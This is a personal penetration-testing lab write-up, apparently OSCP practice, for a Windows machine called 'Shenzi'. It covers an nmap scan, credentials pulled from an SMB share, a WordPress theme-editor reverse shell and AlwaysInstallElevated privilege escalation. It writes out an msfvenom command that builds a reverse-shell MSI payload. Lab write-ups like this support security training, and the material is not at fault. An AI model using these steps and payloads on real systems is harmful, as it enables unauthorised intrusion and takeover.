@@ -1,0 +1,225 @@
+**Start 10:24 06-05-2025**
+
+---
+```
+Scope:
+192.168.145.55
+```
+# Recon
+
+## Nmap
+
+```bash
+sudo nmap -sC -sV shenzi -sT -T5 --min-rate=5000 -Pn -vvvv -p-
+
+PORT      STATE SERVICE       REASON  VERSION
+21/tcp    open  ftp           syn-ack FileZilla ftpd 0.9.41 beta
+| ftp-syst: 
+|_  SYST: UNIX emulated by FileZilla
+80/tcp    open  http          syn-ack Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
+135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+443/tcp   open  ssl/http      syn-ack Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
+| tls-alpn: 
+|_  http/1.1
+| http-title: Welcome to XAMPP
+|_Requested resource was https://shenzi/dashboard/
+445/tcp   open  microsoft-ds? syn-ack
+3306/tcp  open  mysql         syn-ack MariaDB 10.3.24 or later (unauthorized)
+5040/tcp  open  unknown       syn-ack
+7680/tcp  open  pando-pub?    syn-ack
+49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+
+## 21/TCP - FTP
+
+![](../../../assets/d6a65c435b7188b93fcc2f8112d42048.png)
+
+
+## 80/TCP - HTTP
+
+![](../../../assets/4ea347fd938ac120d2e91290efa74276.png)
+
+I tried **PHPInfo** however it wouldn't load. I also tried **phpMyAdmin** but it gave me a `403 Forbidden`:
+
+![](../../../assets/969ddd938ed2692e5392076cf3357628.png)
+
+### Feroxbuster
+
+![](../../../assets/c95df2298becbadc2ce039d8846bf431.png)
+
+I got a few names of the employees:
+
+![](../../../assets/4f27c87fab71b977467d5139c9a721c8.png)
+
+We can throw them into `username-anarchy` and create a wordlist of possible username combinations.
+
+
+## 443/TCP - HTTPS
+
+>[!note]
+>I ran `feroxbuster` here as well, but got the same exact results as on [[#80/TCP - HTTP#Feroxbuster]]
+
+![](../../../assets/0d540ec6e3da07ef4d1e865286bb0d64.png)
+
+On this port I was in fact able to check out the `phpinfo.php` page, let's see whether we can find anything juicy.
+
+![](../../../assets/14bf04004cf34b28e539d55d06ab0682.png)
+
+`allow_url_include` was turned `Off`, meaning **RFI** is not possible. 
+
+However the following functions have no value:
+
+![](../../../assets/907264f93efba7ce5b597c711c9170cb.png)
+
+Meaning **LFI** is LIKELY still possible, we just need to find out where and how.
+
+
+## 445/TCP - SMB
+### Enum4linux-ng
+
+I started off with `enum4linux-ng`:
+
+![](../../../assets/26e6304ad388ddb923ce11013d626029.png)
+
+![](../../../assets/b80cbb827b613ba3c5c0675710e5d3b1.png)
+
+We see it's running on **Windows Server 2019** or **2016**.
+
+Let's check out the SMB port.
+
+### smbclient
+
+![](../../../assets/6d9d316ec3f45f4ea84eba858ce5e109.png)
+
+Nice, we find a `passwords.txt` file.
+
+![](../../../assets/e2976ac72ec104202b90d7b783ac9ede.png)
+
+We got a bunch of credentials, we should add all these to a `users.txt` and `passwords.txt` file so we can use them for password spraying.
+
+## Hidden WordPress Endpoint
+
+So where do we go from this? We found **WordPress** creds but no `/wordpress` endpoint, so does this mean there's a hidden endpoint that `feroxbuster` didn't find?
+
+I decided to try out `/shenzi` since it's the name of the box and lo and behold:
+
+![](../../../assets/f52580a6d13d010df4c55793e7c64375.png)
+
+Where there's a wordpress site, there's a `/wp-admin` login page usually where we could try out the found creds.
+
+![](../../../assets/855278e7eb6401b029d16b79421cf935.png)
+
+Indeed there is.
+
+![](../../../assets/91338b623b782ae41a9c26e435c5c1e7.png)
+
+I try out the previously found creds and it worked!
+
+![](../../../assets/f1c12be54d042d6a10ad67140879bcbb.png)
+
+![](../../../assets/8092ac256e2e2d44ff47258d530d1894.png)
+
+### Plugin reverse shell - FAIL
+
+I'll try to get a reverse shell by uploading a malicious plugin:
+
+![](../../../assets/fbbae5708ccdc571941aac0b592436a3.png)
+
+![](../../../assets/33eef1ece6ac91370b4350aedf7040b5.png)
+
+![](../../../assets/c528c7bb45a7f0c7c53517fbc7a32ee3.png)
+
+Cool, let's instead try it with a **Theme** then.
+
+### Theme reverse shell
+
+We'll head on over to **Appearance** -> **Theme Editor** -> **404.php**:
+
+![](../../../assets/c759f60be6d42712e3f8c063c00a4049.png)
+
+We'll select the `php-ivan` one on revshells
+
+![](../../../assets/adfb9f27da67145c7d42991bc271e917.png)
+
+Click **Update File**:
+
+![](../../../assets/6968bfb0d1d1369ae0297fd3a26b17fb.png)
+
+# Foothold
+## Shell as Shenzi
+
+In order to activate our reverse shell we will now head on over to the following URL:
+
+```
+https://shenzi/shenzi/themes/twentwenty/404.php
+```
+
+Once we click enter our reverse shell should fire:
+
+![](../../../assets/2de5c6fc1e1d342979a7f4aa9640def0.png)
+
+We will now go ahead and get the first flag.
+
+### local.txt
+
+![](../../../assets/3e2179554fef103b99c945ffe15583ce.png)
+
+## Enumeration
+
+![](../../../assets/1fd2a2404f6da6ebbace4a7b6ea92f85.png)
+
+![](../../../assets/0f749ad62013ad2a57db5958965d2e90.png)
+
+Time to transfer `winPEAS` and do some auto enum:
+
+![](../../../assets/65e55b2b6685a8042c4132c368741d09.png)
+
+![](../../../assets/34b0046f3f4db6945c01ac47cb423d1c.png)
+
+We find *shenzi*'s hash:
+
+![](../../../assets/77d3ede5ed2ede5013bfe367933fa66c.png)
+
+>[!important]
+>I then found out about this super important part:
+
+![](../../../assets/de8e1bf9d7c48468f66f38c399afb550.png)
+
+I looked this up on [hacktricks](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html) and found the following on it:
+
+![](../../../assets/c988d7d1c39c93f9207120b699f9a950.png)
+
+# Privilege Escalation
+## MSI shell
+
+This was pretty straightforward and super easy:
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f msi > shell.msi
+```
+
+![](../../../assets/b0ea8901bda0d6a6cf1a076c8e0c29d5.png)
+
+Once transferred I went ahead and executed it and got the shell, ez pz!
+
+## proof.txt
+
+![](../../../assets/6b82ae2c80e3f68bd8c937c60e68bcd9.png)
+
+---
+
+**Finished 12:06 06-05-2025**
+
+[^Links]: [[OSCP Prep]]
+
+#Wordpress #theme #AlwaysInstallElevated 
